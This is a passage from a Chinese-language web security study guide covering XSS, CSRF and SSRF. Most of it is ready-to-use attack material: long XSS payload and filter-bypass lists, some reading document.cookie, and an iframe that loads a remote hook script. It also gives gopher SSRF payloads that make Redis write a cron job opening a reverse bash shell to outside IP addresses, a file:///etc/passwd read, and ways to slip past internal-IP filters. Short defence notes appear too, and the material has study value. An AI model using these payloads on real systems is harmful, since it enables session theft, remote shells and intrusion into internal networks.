?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Preview</title>
<script type="text/javascript" src="purify.js"></script>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="jquery.mobile.js"></script>
</head>
<body>
<script type="text/javascript">
var d= atob('<?php echo $msg; ?>');
var cleanvar = DOMPurify.sanitize(d);
document.write(cleanvar);
</script>
</body>
</html>
```

```
// payload
<div data-role=popup id='-->
&lt;script&gt;alert(1)&lt;/script&gt;'>
</div>
```

**RPO(Relative Path Overwrite)  **

RPO(Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。  

## **2.10 Payload**

**常用**

```
• <script>alert(/xss/)</script>
• <svg onload=alert(document.domain)>
• <img src=document.domain onerror=alert(document.domain)>
• <M onmouseover=alert(document.domain)>M
• <marquee onscroll=alert(document.domain)>
• <a href=javascript:alert(document.domain)>M</a>
• <body onload=alert(document.domain)>
• <details open ontoggle=alert(document.domain)>
• <embed src=javascript:alert(document.domain)>
```

**大小写绕过**

```
• <script>alert(1)</script>
• <sCrIpT>alert(1)</sCrIpT>
• <ScRiPt>alert(1)</ScRiPt>
• <sCrIpT>alert(1)</ScRiPt>
• <ScRiPt>alert(1)</sCrIpT>
• <img src=1 onerror=alert(1)>
• <iMg src=1 oNeRrOr=alert(1)>
• <ImG src=1 OnErRoR=alert(1)>
• <img src=1 onerror="alert(&quot;M&quot;)">
• <marquee onscroll=alert(1)>
• <mArQuEe OnScRoLl=alert(1)>
• <MaRqUeE oNsCrOlL=alert(1)>
```

**各种alert**

```
• <script>alert(1)</script>
• <script>confirm(1)</script>
• <script>prompt(1)</script>
• <script>alert('1')</script>
• <script>alert("1")</script>
• <script>alert`1`</script>
• <script>(alert)(1)</script>
• <script>a=alert,a(1)</script>
• <script>[1].find(alert)</script>
• <script>top["al"+"ert"](1)</script>
• <script>top["a"+"l"+"e"+"r"+"t"](1)</script>
• <script>top[/al/.source+/ert/.source](1)</script>
• <script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)</script>
```

**伪协议**

```
• <a href=javascript:/0/,alert(%22M%22)>M</a>
• <a href=javascript:/00/,alert(%22M%22)>M</a>
• <a href=javascript:/000/,alert(%22M%22)>M</a>
• <a href=javascript:/M/,alert(%22M%22)>M</a>
```

**Chrome XSS auditor bypass  **

```
• ?param=https://&param=@z.exeye.io/import%20rel=import%3E
• <base href=javascript:/M/><a href=,alert(1)>M</a>
• <base href=javascript:/M/><iframe src=,alert(1)></iframe>
```

**长度限制**

```
<script>s+="l"</script>
\...
<script>eval(s)</script>
```

**jquery sourceMappingURL  **

```
</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>
```

**图片名  **

```
"><img src=x onerror=alert(document.cookie)>.gif
```

**过期的payload**

• src=javascript:alert 基本不可以用
• css expression 特性只在旧版本 ie 可用  

**css**

```
<div style="background-image:url(javascript:alert(/xss/))">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
```

**markdown**

```
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&
,!#x27&#x58&#x53&#x53&#x27&#x29>
![a'"`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
```

**iframe**

```
<iframe onload='
var sc = document.createElement("scr" + "ipt");
sc.type = "text/javascr" + "ipt";
sc.src = "http://1.2.3.4/js/hook.js";
document.body.appendChild(sc);
'
/>
```

```
• <iframe src=javascript:alert(1)></iframe>
• <iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>
• <iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+>
iframe>
• <iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>
• <iframe src=https://baidu.com width=1366 height=768></iframe>
• <iframe src=javascript:alert(1) width=1366 height=768></iframe
```

**form**

```
• <form action=javascript:alert(1)><input type=submit>
• <form><button formaction=javascript:alert(1)>M
• <form><input formaction=javascript:alert(1) type=submit value=M>
• <form><input formaction=javascript:alert(1) type=image value=M>
• <form><input formaction=javascript:alert(1) type=image src=1>
```

**meta**

```
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
```

**2.11 持久化**

**基于存储**
有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在 eval(data) 之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。
在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用 String.fromCharCode 来绕过。
**Service Worker**
Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。
在 Chrome 中，可通过 chrome://inspect/#service-workers 来查看 Service Worker 的状态，并进行停止。
**AppCache**
在可控的网络环境下（公共 wif），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。  

# 3.CSRF

**3.1 简介**

跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。

**3.2 分类**

1.资源包含
资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 `<image>、<audio>、<video>、<object>、<script> `等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。
由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。
2.基于表单
通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个 JavaScript 片段，强制受害者的浏览器提交。
该表单可以完全由隐藏的元素组成，以致受害者很难发现它。
如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。

3.XMLHttpRequest
XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。
基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin
Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。
这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器
DOM 的方式。

**3.3 防御**

• 通过 CSRF-token 或者验证码来检测用户提交
• 验证 Referer/Content-Type
• 对于用户修改删除等操作最好都使用 POST 操作
• 避免全站通用的 Cookie，严格设置 Cookie 的域

# 4.SSRF

**4.1 简介**

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。

1.漏洞危害

SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File 协议读取本地文件。
内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。

**4.2 利用方式**

SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。
以curl 为例, 可以使用dict 协议操作Redis、file 协议读文件、gopher 协议反弹Shell 等功能，常见的Payload如下：

```
curl -vvv 'dict://127.0.0.1:6379/info'
curl -vvv 'file:///etc/passwd'
# * 注意: 链接使用单引号，避免$ 变量问题
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```

**4.3 相关危险函数**

SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有
file_get_contents() / fsockopen() / curl_exec() 等。

**4.4 过滤绕过**

1.更改IP地址写法

一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：
•` ^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$`
• `^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
• `^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：
• 8 进制格式：0300.0250.0.1
• 16 进制格式：0xC0.0xA8.0.1
• 10 进制整数格式：3232235521
• 16 进制整数格式：0xC0A80001

• 合并后两位：1.1.278 / 1.1.755
• 合并后三位：1.278 / 1.755 / 3.14159267
另外 IP 中的每一位，各个进制可以混用。
访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。
另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。

2.使用解析到内网的域名

如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。
另外 xip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，例如 192.168.0.1.xip.io，解析到 192.168.0.1。

3.利用解析URL所出现的问题

在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。
比如http://www.baidu.com@192.168.0.1/ 当后端程序通过不正确的正则表达式（比如将http 之后到com为止的字符内容，也就是 www.baidu.com，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，很有可能会认为访问 URL 的 host 为 www.baidu.com，而实际上这个 URL 所请求的内容都是192.168.0.1 上的内容

4.利用跳转

如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。
可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于 URL 中包含了192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。
常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。

5.通过各种非HTTP协议

如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。
比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 `file:///path/to/file` 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 `file:///d:/1.txt` 来访问D盘中1.txt的内容。

6.DNS Rebinding

一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。

但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。

要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：

- 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
- 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
- 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
- 由于已经绕过验证，所以服务器端返回访问内网资源的结果。

7.利用IPv6

有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 `[::]` `0000::1` 或IPv6的内网域名来绕过过滤。

8.利用IDN

一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。

在这些字符中，部分字符会在访问时做一个等价转换，例如 `ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ` 和 `example.com` 等同。利用这种方式，可以用 `① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩` 等字符绕过内网限制。

**4.5 可能的利用点**

1.内网服务

- Apache Hadoop远程命令执行
- axis2-admin部署Server命令执行
- Confluence SSRF
- counchdb WEB API远程命令执行
- dict
- docker API远程命令执行
- Elasticsearch引擎Groovy脚本命令执行
- ftp / ftps（FTP爆破）
- glassfish任意文件读取和war文件部署间接命令执行
- gopher
- HFS远程命令执行
- http、https
- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
- Java调试接口命令执行
- JBOSS远程Invoker war命令执行
- Jenkins Scripts接口命令执行
- ldap
- mongodb
- php_fpm/fastcgi 命令执行
- rtsp - smb/smbs（连接SMB）
- sftp
- ShellShock 命令执行
- Struts2 命令执行
- telnet
- tftp（UDP协议扩展）
- tomcat命令执行
- WebDav PUT上传任意文件
- WebSphere Admin可部署war间接命令执行
- zentoPMS远程命令执行

2.Redis利用

- 写ssh公钥
- 写crontab
- 写WebShell
- Windows写启动项
- 主从复制加载 .so 文件
- 主从复制写无损文件

3.云主机

在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果。

4.防御方式

- 过滤返回的信息
- 统一错误信息
- 限制请求的端口
- 禁止不常用的协议
- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单
